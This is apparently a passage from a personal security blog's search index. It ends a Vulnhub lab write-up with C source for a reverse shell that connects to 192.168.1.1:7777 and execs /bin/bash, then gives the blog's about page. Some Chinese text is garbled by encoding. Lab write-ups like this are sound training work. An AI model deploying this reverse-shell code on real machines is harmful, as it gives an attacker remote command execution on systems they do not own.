class="hljs-string">&lt;sys/stat.h&gt;</span></span><br><br><span class="hljs-type">int</span> tcp_port = <span class="hljs-number">7777</span>;<br><span class="hljs-type">char</span> *ip = <span class="hljs-string">&quot;192.168.1.1&quot;</span>;<br><span class="hljs-function"><span class="hljs-type">void</span> <span class="hljs-title">rev_shell</span><span class="hljs-params">()</span></span>&#123;<br><span class="hljs-type">int</span> fd;<br><span class="hljs-keyword">if</span> ( fork() &lt;= <span class="hljs-number">0</span>)&#123;<br><span class="hljs-keyword">struct</span> <span class="hljs-title class_">sockaddr_in</span> addr;<br>addr.sin_family = AF_INET;<br>addr.sin_port = <span class="hljs-built_in">htons</span>(tcp_port);<br>addr.sin_addr.s_addr = <span class="hljs-built_in">inet_addr</span>(ip);<br><br>fd = <span class="hljs-built_in">socket</span>(AF_INET, SOCK_STREAM, <span class="hljs-number">0</span>);<br><span class="hljs-keyword">if</span> ( <span class="hljs-built_in">connect</span>(fd, (<span class="hljs-keyword">struct</span> sockaddr*)&amp;addr, <span class="hljs-built_in">sizeof</span>(addr)) )&#123;<br><span class="hljs-built_in">exit</span>(<span class="hljs-number">0</span>);<br>&#125;<br><br><span class="hljs-built_in">dup2</span>(fd, <span class="hljs-number">0</span>);<br><span class="hljs-comment">//dup2(fd, 1);</span><br><span class="hljs-comment">//dup2(fd, 2);</span><br><span class="hljs-built_in">execve</span>(<span class="hljs-string">&quot;/bin/bash&quot;</span>, <span class="hljs-number">0LL</span>, <span class="hljs-number">0LL</span>);<br>&#125;<br><span class="hljs-keyword">return</span>;<br>&#125;<br><br><span class="hljs-function"><span class="hljs-type">void</span> <span class="hljs-title">main</span><span class="hljs-params">(<span class="hljs-type">int</span> argc, <span class="hljs-type">char</span> <span class="hljs-type">const</span> *argv[])</span></span><br><span class="hljs-function"></span>&#123;<br><span class="hljs-built_in">rev_shell</span>();<br><span class="hljs-keyword">return</span> <span class="hljs-number">0</span>;<br>&#125;<br></code></pre></td></tr></table></figure><ol start="8"><li>å¯æƒœè¿™ä¸ªä»£ç åå¼¹çš„shellåªèƒ½æ‰§è¡Œå‘½ä»¤ä¸èƒ½çœ‹åˆ°å›æ˜¾ï¼Œåªèƒ½é‡æ–°å¼¹ä¸€ä¸ª<img src="/2023/11/26/vulnhub%E9%9D%B6%E5%9C%BA%E6%97%A5%E8%AE%B0/image-20231020133345647.png" alt="image-20231020133345647"></li></ol><p>æ‹¿ä¸‹</p><p>â€‹    </p>]]></content>
    
    
    
    <tags>
      
      <tag>è§£é¢˜è®°å½•</tag>
      
      <tag>vulnhub</tag>
      
      <tag>å­¦ä¹ </tag>
      
    </tags>
    
  </entry>
  
  
  
  
  
  
  <entry>
    <title>about</title>
    <link href="/"/>
    <url>/</url>
    
    <content type="html"><![CDATA[<p>Hello everyone, hereâ€™s <strong>greed</strong> ğŸ¤—.</p><p>welcome to my blog and thanks for your views ğŸ˜€ .</p><p>My records include but are not limited to the following: </p><ul><li>CTF writeup(web)</li><li>Cyber Range(like Vulnhub)</li><li>Study notes</li><li>small knowledge points encountered</li><li>â€¦</li></ul><p>Thanks to the technical support provided by the following websites:</p><ul><li><a href="https://hexo.io/zh-cn/">Hexo</a></li><li><a href="https://github.com/fluid-dev/hexo-theme-fluid">fluid-dev&#x2F;hexo-theme-fluid: :ocean:</a></li><li><a href="https://waline.js.org/">Walineè¯„è®ºç³»ç»Ÿ</a></li><li><a href="https://hitokoto.cn/">ä¸€è¨€</a></li><li><a href="https://busuanzi.ibruce.info/">ä¸è’œå­ - æç®€ç½‘é¡µè®¡æ•°å™¨</a></li></ul><!-- That's all, thanks again. -->]]></content>
    
  </entry>
  
  
  
</search>
